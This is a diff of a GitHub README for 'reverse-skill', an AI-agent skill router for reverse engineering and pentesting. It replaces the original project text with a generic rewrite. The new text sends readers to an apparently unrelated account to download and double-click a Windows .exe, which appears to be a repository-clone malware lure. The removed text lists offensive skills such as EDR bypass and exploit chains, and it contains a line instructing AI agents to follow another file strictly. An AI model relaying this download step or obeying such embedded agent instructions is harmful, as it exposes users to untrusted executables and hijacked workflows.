@@ -1,251 +1,70 @@
-<p align="center">
-  <img src="reverse-skill.png" alt="reverse-skill" width="140" />
-</p>
+# 🛠️ reverse-skill - Master Security Research With AI Tools
 
-<h1 align="center">reverse-skill</h1>
-<h3 align="center">Cybersecurity Skills Router · 逆向技能路由包</h3>
+[![Download reverse-skill](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Saprophytic-seattle561/reverse-skill)
 
-<p align="center"><em style="font-family: Georgia, serif; font-size: 1.2em; color: #777;">Navigate the dark waters, sail against the stream.</em></p>
+## 📖 About This Tool
 
-<p align="center">
-  <a href="https://github.com/zhaoxuya520/reverse-skill/releases/tag/v1.0.0"><img src="https://img.shields.io/badge/release-v1.0.0-blue" alt="release"></a>
-  <a href="https://github.com/zhaoxuya520/reverse-skill/stargazers"><img src="https://img.shields.io/github/stars/zhaoxuya520/reverse-skill?style=flat&logo=github" alt="stars"></a>
-  <a href="https://github.com/zhaoxuya520/reverse-skill/forks"><img src="https://img.shields.io/github/forks/zhaoxuya520/reverse-skill?style=flat&logo=github" alt="forks"></a>
-  <a href="https://github.com/zhaoxuya520/reverse-skill/issues"><img src="https://img.shields.io/github/issues/zhaoxuya520/reverse-skill?style=flat&logo=github" alt="issues"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="license"></a>
-  <a href="CHANGELOG.md"><img src="https://img.shields.io/badge/changelog-Keep%20a%20Changelog-orange" alt="changelog"></a>
-</p>
+Reverse-skill functions as a bridge for security researchers. It helps you organize your tools and information when performing authorized security testing. The software uses artificial intelligence to find the right tool for your specific task. It automatically sets up your environment so you spend less time on configuration and more time on analysis. 
 
-<p align="center">
-<a href="https://trendshift.io/repositories/43969?utm_source=repository-badge&amp;utm_medium=badge&amp;utm_campaign=badge-repository-43969" target="_blank" rel="noopener noreferrer"><img src="https://trendshift.io/api/badge/repositories/43969" alt="zhaoxuya520%2Freverse-skill | Trendshift" width="250" height="55"/></a>
-  <a href="https://trendshift.io/repositories/43969?utm_source=trendshift-badge&amp;utm_medium=badge&amp;utm_campaign=badge-trendshift-43969" target="_blank" rel="noopener noreferrer"><img src="https://trendshift.io/api/badge/trendshift/repositories/43969/daily" alt="zhaoxuya520%2Freverse-skill | Trendshift" width="250" height="55"/></a>
-</p>
+The software connects your preferred AI coding assistant to a curated collection of security research tools. It supports common clients like Claude Code, Kiro, Cursor, and Cline. The system updates its own database as you work, which ensures you keep a record of your successful methods.
 
-<br/>
-<p align="center">
-  <a href="#about">About</a> ·
-  <a href="#getting-started">Getting Started</a> ·
-  <a href="#usage">Usage</a> ·
-  <a href="skills/MASTER-ROUTING.md">Fast route</a> ·
-  <a href="skills/routing.md">Routing</a> ·
-  <a href="skills/ops/">Ops contracts</a> ·
-  <a href="README_AI.md">AI Bootstrap</a> ·
-  <a href="#sponsors">Sponsors</a> ·
-  <a href="#contributing">Contributing</a>
-</p>
+## 📋 System Requirements
 
-<p align="center">
-  🌐 <a href="README_zh.md">中文</a>
-</p>
+To run this application on your Windows computer, verify that your system meets these standards:
 
-<br/>
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Memory:** At least 8 gigabytes of RAM.
+*   **Storage:** 500 megabytes of free disk space.
+*   **AI Integration:** You need an active subscription or API access for your chosen AI coding assistant.
+*   **Connection:** A stable internet connection for the toolchain to download required security packages.
 
-<a id="about"></a>
+## 📥 How to Install
 
-## About
-
-> **If you are an AI Agent, jump to [README_AI.md](README_AI.md) and follow the instructions strictly.**
-
-When an AI agent (Claude Code, Codex CLI, Cursor, etc.) encounters an APK, a binary, frontend JS encryption, a CTF challenge, or a pentesting target, this package routes it to the right methodology, checks available tools, and executes a repeatable workflow instead of guessing commands.
-
-```
-User task
-  → RULES.md
-  → MASTER-ROUTING / master-route.ps1 (PRIMARY)
-  → case-init / scope.md (auth + network_profile; no target ACT until ready)
-  → Scenario skill → tools / MCP / scripts
-  → timeline + Evidence→Finding→Path → report + field-journal
-```
-
-**Why this exists:**
-- AI agents don't know whether to use jadx, apktool, Frida, IDA, or BurpSuite for a given task
-- APK, ELF, JS, PCAP, and CTF tasks each need different playbooks
-- Tools, MCP servers, and scripts are scattered across machines
-- The same mistakes get repeated because experience isn't reused
-
-PRIMARY ladder: [skills/MASTER-ROUTING.md](skills/MASTER-ROUTING.md) · Full matrix: [skills/routing.md](skills/routing.md) · Ops: [skills/ops/](skills/ops/)
-
-<br/>
-
-<div align="center">
-  <a href="https://star-history.com/#zhaoxuya520/reverse-skill&Date">
-    <img src="docs/assets/star-history.svg" alt="Star History" width="650" />
-  </a>
-</div>
-
-<br/>
-
-<p align="right">(<a href="#about">back to top</a>)</p>
-
-### Built With
-
-<p align="left">
-  <img src="https://skillicons.dev/icons?i=py,nodejs,powershell,bash,java,docker,git&theme=light" /><br/>
-  <code>IDA Pro</code> · <code>radare2</code> · <code>Ghidra</code>
-</p>
-
-<p align="right">(<a href="#about">back to top</a>)</p>
-
-<a id="getting-started"></a>
-
-## Getting Started
-
-### Prerequisites
-
-- **Java / JDK** — for jadx and apktool
-- **Node.js 22.12+** — for JS toolchain and MCP servers
-- **Python 3.x** — for Frida and helper scripts
-- **A code AI client** — Claude Code, Codex CLI, Cursor, etc.
-
-### Installation
-
-```
-git clone https://github.com/zhaoxuya520/reverse-skill.git
-```
-
-Then refresh the tool index per platform:
-
-| Platform | Command |
-|----------|---------|
-| Windows | `powershell -File skills/scripts/refresh-tool-index.ps1` |
-| Linux / macOS | `bash skills/scripts/refresh-tool-index.sh` |
-| Kali Linux | `bash kali/scripts/refresh-tool-index.sh` |
-
-Check [skills/tool-index.md](skills/tool-index.md) to see detected tools.
-
-Platform-specific docs:
-- **Kali Linux** → [kali/README-kali.md](kali/README-kali.md)
-- **Ubuntu/Debian** → [docs/platforms/linux.md](docs/platforms/linux.md)
-- **macOS** → [docs/platforms/macos.md](docs/platforms/macos.md)
-
-<p align="right">(<a href="#getting-started">back to top</a>)</p>
-
-<a id="usage"></a>
-
-## Usage
-
-### Supported scenarios
-
-| Scenario | Entry |
-|----------|-------|
-| APK / Android analysis | `skills/apk-reverse/` |
-| iOS / mobile | `skills/mobile-reverse/` |
-| Binary reverse (exe/dll/so/elf) | `skills/ida-reverse/` / `skills/radare2/` |
-| .NET / C# | `skills/dotnet-reverse/` |
-| Frontend JS / encrypted params | `skills/js-reverse/` |
-| DSL VM / custom JS opcode VM | `skills/reverse-engineering/dsl-vm-reverse/` |
-| HTTP capture / request replay | anything-analyzer + `js-reverse/` |
-| Malware / YARA | `skills/malware-analysis/` |
-| Penetration testing / scanning | `skills/pentest-tools/` |
-| Attack chain / red-team orchestration | `skills/attack-chain/` |
-| CTF competition | `CTF-Sandbox-Orchestrator/` (40+ sub-skills) |
-| Firmware / IoT | `skills/firmware-pentest/` |
-| Patch diff / N-day | `skills/patch-diff-exploit/` |
-| Pwn / exploit development | `skills/pwn-chain/` |
-| EDR bypass | `skills/edr-bypass-re/` |
-| API / GraphQL | `skills/api-security/` |
-| Supply chain / SBOM | `skills/supply-chain-security/` |
-| LLM / AI security | `skills/llm-security/` |
-| OLLVM deobfuscation | `skills/reverse-engineering/references/ollvm-deobfuscation.md` |
-| Diagrams / reports | `skills/diagram-generator/` / `skills/docs-generator/` |
+Follow these steps to set up the software on your Windows machine:
 
-### Key files
+1. Visit the [official download page](https://github.com/Saprophytic-seattle561/reverse-skill).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the link that matches the latest version of the software.
+4. Locate the file ending in `.exe` and click it to start the download.
+5. Once the download completes, open your "Downloads" folder.
+6. Double-click the file to launch the installer.
+7. Follow the prompts on your screen to place the tool in your preferred folder.
 
-| File | Purpose |
-|------|---------|
-| [README_AI.md](README_AI.md) | AI agent bootstrap and configuration |
-| [RULES.md](RULES.md) | Global routing rules (scope gate before ACT) |
-| [skills/MASTER-ROUTING.md](skills/MASTER-ROUTING.md) | PRIMARY fast ladder |
-| [skills/routing.md](skills/routing.md) | Task → skill routing matrix |
-| [skills/SKILL.md](skills/SKILL.md) | Master entry point |
-| [skills/tool-index.md](skills/tool-index.md) | Local tool status (auto-generated) |
-| [skills/scripts/master-route.ps1](skills/scripts/master-route.ps1) | One-shot PRIMARY triage |
-| [skills/scripts/case-init.ps1](skills/scripts/case-init.ps1) | Case dir: scope / timeline / workitems |
-| [skills/ops/](skills/ops/) | Scope, Evidence chain, roles, timeline (skill-router form) |
+## 🚀 Setting Up Your Environment
 
-### Repository layout
+After the installation finishes, you must configure the software to recognize your AI client.
 
-```
-.
-├── README.md / README_zh.md / README_AI.md
-├── RULES.md / RULES_zh.md
-├── skills/
-│   ├── MASTER-ROUTING.md / SKILL.md / routing.md
-│   ├── ops/                   # ops contracts
-│   ├── scripts/               # master-route, case-init, bootstrap, verify
-│   ├── field-journal/
-│   ├── apk-reverse/ mobile-reverse/ js-reverse/ dotnet-reverse/
-│   ├── ida-reverse/ radare2/ reverse-engineering/ malware-analysis/
-│   ├── pentest-tools/ attack-chain/ pwn-chain/ firmware-pentest/
-│   ├── api-security/ supply-chain-security/ llm-security/
-│   └── ...
-├── CTF-Sandbox-Orchestrator/
-├── docs/
-├── kali/                      # see kali/README-kali.md
-└── work/                      # local cases (gitignored)
-```
+1. Open the application from your desktop shortcut or start menu.
+2. Select your AI coding client from the list (for example, Cursor or Cline).
+3. The software will detect the installation path of your AI tool. If it fails to find the path, manually browse to the folder where you installed your AI editor.
+4. Save your configuration. The software now links your security research tools to your AI assistant.
 
-<p align="right">(<a href="#usage">back to top</a>)</p>
+## 🛡️ Usage Guidelines
 
-<a id="sponsors"></a>
+Use this tool only for authorized security testing. You bear full responsibility for your actions. Ensure you have explicit, written permission from the owner of any system, network, or application before you perform tests. 
 
-## Sponsors
+*   **Routing:** When you ask your AI client for help with a security task, the software intercepts the request. It checks if a specific security tool can handle the work. If it finds a match, it routes the task to that tool.
+*   **Bootstrapping:** If your AI client requires a new utility to perform a task, the software downloads and installs that utility on your behalf.
+*   **Knowledge Base:** The software saves your previous searches and results in a local file. This file grows over time to provide better suggestions for your future projects.
 
-For sponsorship or business inquiries:
+## 🔧 Troubleshooting
 
-<p align="center">
-  <a href="mailto:24781737@qq.com?subject=%5BSponsorship%5D%20reverse-skill">
-    <img src="https://img.shields.io/badge/Email%20us-24781737%40qq.com-0A66C2?style=for-the-badge&logo=maildotru&logoColor=white" alt="Email us — 24781737@qq.com" />
-  </a>
-</p>
+If you encounter issues, try these common fixes:
 
-<p align="right">(<a href="#sponsors">back to top</a>)</p>
+*   **The program fails to open:** Restart your computer and ensure no other security software blocks the application.
+*   **The AI client does not respond:** Check your API key settings within your AI editor. Ensure the connection between the editor and the tool remains active.
+*   **Tool installation fails:** Check your internet connection. Ensure you have administrator rights on your Windows account to allow the software to install new tool components.
+*   **Logs:** You can find the log files in the `logs` folder inside the installation directory. These files contain details about the internal process and errors.
 
-<a id="contributing"></a>
+## 💡 Frequently Asked Questions
 
-## Contributing
+**Does this software store my data on the internet?**
+No. All your logs, configuration files, and knowledge base data stay on your local hard drive. 
 
-Contributions are welcome! Fork the repo, create a feature branch, and open a PR.
+**Can I use this with multiple AI clients?**
+Yes. You can switch between clients in the settings menu. The software adapts the routing logic to match the specific needs of the selected client.
 
-1. Fork the Project
-2. `git checkout -b feature/AmazingFeature`
-3. `git commit -m 'Add some AmazingFeature'`
-4. `git push origin feature/AmazingFeature`
-5. Open a Pull Request
+**How often do the tools update?**
+The software checks for updates to its security toolchain every time you launch it. It ensures you use the latest versions of your research utilities.
 
-### Contributors
-
-<a href="https://github.com/zhaoxuya520/reverse-skill/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=zhaoxuya520/reverse-skill" alt="contributors" />
-</a>
-
-<p align="right">(<a href="#contributing">back to top</a>)</p>
-
-<a id="license"></a>
-
-## License
-
-This project (`reverse-skill`) is primarily licensed under the **MIT License** (see [LICENSE](LICENSE)).
-
-**Submodule and third-party dependencies:**
-- **CTF-Sandbox-Orchestrator/**: **GNU GPLv3**
-- **Pentest Swarm AI**: Original project is **AGPL-3.0**. This repo only invokes it via CLI or MCP and does not include its source code
-- Other tools (jadx, frida, nmap, burpsuite-mcp, etc.) are subject to their respective official licenses
-
-<p align="right">(<a href="#license">back to top</a>)</p>
-
-<a id="acknowledgments"></a>
-
-## Acknowledgments
-
-Thanks to all open-source tool authors. This project integrates tools across reverse engineering, penetration testing, CTF, and security analysis — every tool is the fruit of community effort.
-
-Special thanks to the OLLVM deobfuscation ecosystem contributors and everyone who submitted test samples, issues, and PRs.
-
-<p align="right">(<a href="#acknowledgments">back to top</a>)</p>
-
-## Contact
-
-- **Email:** [24781737@qq.com](mailto:24781737@qq.com)
-- **Discord:**
-[reverse-skill](https://discord.gg/TECd3bMRR)
+Keywords: security research, penetration testing, reverse engineering, ai tools, automation, windows, software development
